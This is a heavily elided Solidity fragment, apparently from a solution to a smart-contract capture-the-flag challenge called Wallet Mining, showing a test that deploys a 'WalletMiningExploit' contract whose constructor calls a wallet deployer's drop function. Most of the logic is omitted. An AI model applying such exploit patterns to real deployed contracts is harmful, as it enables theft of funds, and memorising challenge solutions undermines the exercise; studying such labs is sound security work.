...
contract WalletMiningChallenge is Test {
    ...
    function test_walletMining() public checkSolvedByPlayer {
        ...
        // Step 6: Deploy the Safe and execute the exploit
         new WalletMiningExploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
...
contract WalletMiningExploit  {
    constructor (
        ...
        require(walletDeployer.drop(address(safe), initializer, saltNonce), "deploy failed"); // Ensure the deployment was successful.
